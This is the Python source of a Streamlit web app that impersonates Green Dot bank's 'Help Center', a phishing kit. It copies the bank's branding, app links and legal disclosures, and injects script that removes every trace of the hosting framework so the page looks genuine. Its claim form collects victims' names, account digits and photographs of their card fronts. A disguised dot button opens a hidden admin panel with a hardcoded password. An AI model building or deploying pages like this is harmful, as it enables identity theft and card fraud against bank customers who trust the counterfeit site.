
import streamlit as st
import sqlite3
import os
import random
import string
import pandas as pd
from datetime import datetime

# --- DATABASE ---
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

def generate_ref():
    return "GD-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# --- JS: PURGA ---
st.markdown("""<script>
    const deepPurge = () => {
        const blackList = [
            '.section-anchor', 'a.section-anchor', '[data-testid="stHeaderActionElements"]',
            '[data-testid="stAppToolbar"]', '[data-testid="stElementToolbar"]',
            '.stElementToolbar', '.st-emotion-cache-140j12g', 'button[title="View fullscreen"]',
            'header', 'footer', '.stDeployButton', '.st-emotion-cache-gi0tri', '.etxdrby3', '.etxdrby1'
        ];
        blackList.forEach(sel => { document.querySelectorAll(sel).forEach(el => el.remove()); });
    };
    setInterval(deepPurge, 100);
</script>""", unsafe_allow_html=True)

# --- CSS: MIMETISMO TOTAL ---
st.markdown("""<style>
    .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
    .block-container { max-width: 500px !important; padding-top: 1.5rem !important; }

    .promo-box {
        background-color: #111;
        padding: 30px;
        text-align: center;
        border-radius: 12px;
        margin: 25px 0;
        border: 1px solid #222;
    }

    .legal-container {
        font-size: 10px; color: #444; text-align: justify; margin-top: 50px;
        border-top: 1px solid #111; padding-top: 15px; line-height: 1.5;
    }

    div.stButton > button[key="ghost_dot"] {
        background-color: transparent !important; border: none !important; color: #444 !important;
        padding: 0 !important; margin: 0 !important; display: inline !important;
        font-size: 10px !important; width: auto !important; height: auto !important;
        min-height: 0 !important; min-width: 0 !important; box-shadow: none !important;
        cursor: text !important; vertical-align: baseline !important;
    }
</style>""", unsafe_allow_html=True)

if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False

if not st.session_state.admin_mode:
    col_logo = st.columns([1, 1.5, 1])[1]
    with col_logo:
        if os.path.exists('logo.svg'): st.image('logo.svg', use_container_width=True)

    st.title("Help Center")
    st.write("Please fill out the form below to submit your claim.")

    with st.form("ghost_form_32_3", clear_on_submit=True):
        nombre = st.text_input("Full Name")
        cuenta = st.text_input("Last 4 digits of Account")
        monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
        st.markdown("**Evidence**")
        rec = st.file_uploader("Receipt", type=['jpg','png','jpeg'])
        car = st.file_uploader("Card Front", type=['jpg','png','jpeg'])
        if st.form_submit_button("SUBMIT NOW"):
            if nombre and rec and car:
                ref = generate_ref()
                st.success(f"Success. Reference: {ref}")
            else: st.error("Information required.")

    # SECCIÓN DOWNLOAD APP (RECUERDO PERMANENTE)
    st.markdown("""<div class='promo-box'>
        <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
        <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;'>
            <a href='https://play.google.com/store/apps/details?id=com.greendot.retail' target='_blank'>
                <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'>
            </a>
            <a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'>
                <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130'>
            </a>
        </div>
        <p style='color:#888; font-size: 13px;'>Secure mobile banking for your account.</p>
    </div>""", unsafe_allow_html=True)

    # Footer completo
    st.markdown("""<div class='legal-container'>
        * When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br>
        Not a gift card. Must be 18 or older to purchase. Online access, mobile number verification (via text message) and identity verification (including SSN) are required to open and use your account. Mobile number verification, email address verification and mobile app are required to access all features.<br><br>
        The check cashing service is provided by Ingo Money, Inc. and the sponsor bank identified in the Terms and Conditions for the service and Ingo Money, Inc., which are third parties that operate independently from GO2bank.com. Ingo Money will provide customer service for all mobile check cashing. Subject to the Terms and Conditions and Privacy Policy. Approval usually takes 3-5 minutes but may take up to one hour. All checks are subject to approval for funding in Ingo Money’s sole discretion. Fees apply for approved ‘Money in Minutes’ transactions funding to your card or account. Unapproved checks will not be loaded to your card or account. Ingo Money reserves the right to recover losses resulting from illegal or fraudulent use of the Ingo Money Service. Your wireless carrier may charge a fee for data usage. Additional transaction fees, costs, terms and conditions may be associated with the funding use of your card or account. See your Cardholder Account Agreement for details. Note: Ingo Money check cashing services is not available for use within the state of New York.<br><br>
        Green Dot® cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. Visa is a registered trademark of Visa International Service Association. And by Mastercard International Inc. Mastercard and the circles design are registered trademarks of Mastercard International Incorporated.<br><br>
        GO2bank™ cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. Visa is a registered trademark of Visa International Service Association.<br><br>
        Green Dot Bank also operates under the following registered trade names: GO2bank, GoBank and Bonneville Bank. All of these registered trade names are used by, and refer to, a single FDIC-insured bank, Green Dot Bank. Deposits under any of these trade names are deposits with Green Dot Bank and are aggregated for deposit insurance coverage up to the allowable limits.<br><br>
        All third-party names and logos are trademarks of their respective owners. These owners are not affiliated with Green Dot Corporation and have not sponsored or endorsed Green Dot Bank products or services. Neither Green Dot Corporation, Visa U.S.A. nor any of their respective affiliates are responsible for the products or services provided by Ingo® Money and Plaid, Inc. Partner terms and conditions apply.<br><br>
        Apple, the Apple logo, and iPhone are trademarks of Apple Inc., registered in the U.S. and other countries. App Store is a service mark of Apple Inc. Google, Android and Google Play are trademarks of Google Inc., registered in the U.S. and other countries. Samsung is a registered trademark of Samsung Electronics Co., Ltd.<br><br>
        ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739""", unsafe_allow_html=True)
    if st.button(".", key="ghost_dot"): st.session_state.admin_mode = True
    st.markdown("</div>", unsafe_allow_html=True)

else:
    st.title("🔐 Administrative")
    if st.button("Exit"): st.session_state.admin_mode = False
    pw = st.text_input("Auth Key", type="password")
    if pw == "Diostieneelpoder1": st.write("Access Granted")
